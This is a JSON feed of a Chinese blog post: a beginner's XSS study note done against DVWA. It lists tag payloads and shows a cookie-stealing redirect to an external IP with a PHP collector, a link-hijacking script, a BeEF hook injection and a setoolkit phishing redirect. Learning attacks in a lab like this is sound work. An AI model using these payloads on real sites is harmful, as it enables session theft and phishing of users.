{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog • All posts by \"xss\" category",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "url": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "title": "XSS初学习1",
            "date_published": "2023-06-26T11:55:23.905Z",
            "content_html": "<h2 id=\"xss介绍\"><a class=\"markdownIt-Anchor\" href=\"#xss介绍\">#</a> XSS 介绍</h2>\n<h3 id=\"xss简历\"><a class=\"markdownIt-Anchor\" href=\"#xss简历\">#</a> XSS 简历</h3>\n<p>XSS 攻击通常指利用网页开发时留下的漏洞，通过巧妙的方法注入恶意代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。</p>\n<h3 id=\"xss原理\"><a class=\"markdownIt-Anchor\" href=\"#xss原理\">#</a> XSS 原理</h3>\n<p>程序对输入和输出的控制不够严格，导致构建的恶意代码输入后，在前端浏览的时候被当作有效的代码解析执行，从而产生危害</p>\n<h2 id=\"xss分类\"><a class=\"markdownIt-Anchor\" href=\"#xss分类\">#</a> XSS 分类</h2>\n<h3 id=\"反射型\"><a class=\"markdownIt-Anchor\" href=\"#反射型\">#</a> 反射型</h3>\n<p>将用户输入的内容作为代码让浏览器执行，一般需要引诱用户访问攻击者构造的 url，攻击发生在客户端，非持久型</p>\n<p>位置：用户登录入口，网站搜索框等</p>\n<p>案例：DVWA<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/igRd3bOoJtVz5DY.png\" alt=\"屏幕截图 2023-06-26 105406.png\"></p>\n<h3 id=\"存储型\"><a class=\"markdownIt-Anchor\" href=\"#存储型\">#</a> 存储型</h3>\n<p>将攻击脚本永远嵌入一个页面中，用户访问时自己触发，这个恶意程序被保存在服务端数据库中，属于发生在客户端的攻击，是持久型的。</p>\n<p>案例：DVWA<br>\n 先弹一个 cookie，点击别的页面离开，再返回这个页面会自动弹 cookie<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/TJC6ANsx5w3ySpO.png\" alt=\"屏幕截图 2023-06-26 111329.png\"></p>\n<h3 id=\"dom型\"><a class=\"markdownIt-Anchor\" href=\"#dom型\">#</a> DOM 型</h3>\n<p>DOM 全称 Document Object Model，是一个与平台，编程语言无关的接口，允许程序或者脚本动态地访问和更新文档内容，结构和样式，处理后的结果能够成为显示页面的一部分。由于 DOM 型 XSS 不与后台服务器产生数据交互，是一种通过 DOM 操作前端代码输出的时候产生的问题，大部分属于反射型<br>\n案例：DVWA<br>\nDOM 型不与服务端交互数据，完全的前端执行恶意代码，这里可以 select 一个语言，选 english 观察 url 有？default=english, 直接构造<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/WaRwV9Cjf67LqZo.png\" alt=\"屏幕截图 2023-06-26 112550.png\"></p>\n<h2 id=\"常用攻击标签\"><a class=\"markdownIt-Anchor\" href=\"#常用攻击标签\">#</a> 常用攻击标签</h2>\n<h3 id=\"script\"><a class=\"markdownIt-Anchor\" href=\"#script\">#</a> script</h3>\n<p><code>&lt;scirpt&gt;alert(&quot;document.cookie&quot;);&lt;/script&gt;</code></p>\n<h3 id=\"img\"><a class=\"markdownIt-Anchor\" href=\"#img\">#</a> img</h3>\n<p>图片加载错误时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>鼠标指针移动到元素时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>鼠标指针移出时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"a\"><a class=\"markdownIt-Anchor\" href=\"#a\">#</a> a</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=javascript:alert(&#x27;1&#x27;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"input\"><a class=\"markdownIt-Anchor\" href=\"#input\">#</a> input</h3>\n<p>按下按键时触发<br>\n示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">按下按键时触发</span><br><span class=\"line\">示例：&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">松开按键式时触发</span><br><span class=\"line\">示例：&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">竞争焦点，从而触发onblur事件</span><br><span class=\"line\"></span><br><span class=\"line\">示例：&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"style\"><a class=\"markdownIt-Anchor\" href=\"#style\">#</a> style</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"应用\"><a class=\"markdownIt-Anchor\" href=\"#应用\">#</a> 应用</h2>\n<h3 id=\"获取cookie这里反射型为例\"><a class=\"markdownIt-Anchor\" href=\"#获取cookie这里反射型为例\">#</a> 获取 cookie:(这里反射型为例)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?uname=&lt;script&gt;document.location=&quot;http://47.108.208.33/testxss/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br><span class=\"line\">document.location是重定向的意思</span><br><span class=\"line\"></span><br><span class=\"line\">vps的cookie.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$cookie=$_GET[&#x27;cookie&#x27;];</span><br><span class=\"line\">file_put_contents(&#x27;cookie.txt&#x27;,$cookie);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>输入恶意连接会跳转到那个 url, 并将 cookie 写进 cookie.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class=\"line\">script标签之中可以输入任意js代码,rg</span><br><span class=\"line\">&lt;script&gt;console.log(&#x27;hacker&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"篡改恶意网页链接以反射性为例\"><a class=\"markdownIt-Anchor\" href=\"#篡改恶意网页链接以反射性为例\">#</a> 篡改恶意网页链接 (以反射性为例)</h3>\n<p>window.onload: 当窗口加载时，执行匿名函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"variable language_\">window</span>.<span class=\"property\">onload</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> link=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;link.<span class=\"property\">length</span>;j++)&#123;</span><br><span class=\"line\">link[j].<span class=\"property\">href</span>=<span class=\"string\">&quot;http://attacker-site.com/&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"beef指向恶意链接\"><a class=\"markdownIt-Anchor\" href=\"#beef指向恶意链接\">#</a> beef 指向恶意链接</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">beef -xss</span><br><span class=\"line\">在存在xss的地方输入：</span><br><span class=\"line\">&lt;script src=&quot;http://192.168.240.122:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">在beef可以看到目标上线</span><br></pre></td></tr></table></figure>\n<p>比如我这里用 kali 开启 beef-xss，Windows 主机开 DVWA，在 kali 主机登录 DVWA 在存储型 xss 插入 hook，Windows 主机登录 DVWA 浏览 xss（stored），可以看到 beef 中已经获取了 Windows 的浏览器的信息<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/HBaDmdNzP465FLJ.png\" alt=\"屏幕截图 2023-06-26 193218.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/E17AdK3IcD2UFWR.png\" alt=\"屏幕截图 2023-06-26 193222.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/ezNSPEUfZtKXj3r.png\" alt=\"屏幕截图 2023-06-26 193635.png\"></p>\n<h3 id=\"盗取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#盗取用户信息\">#</a> 盗取用户信息</h3>\n<p>setoolkit 工具克隆钓鱼网站<br>\n xss payload:(以存储型为例)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;window.location=&quot;ip&quot;&lt;/script&gt;</span><br><span class=\"line\">这里的IP是用setoolkit伪造的页面的IP,我这里是</span><br><span class=\"line\">&lt;script&gt;window.location=&quot;http://192.168.206.123/&quot;&lt;/script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>只要用户访问 kali 攻击机的地址就能看到伪造页面，此时用户的输入都被 kali 监听到</p>\n",
            "tags": []
        }
    ]
}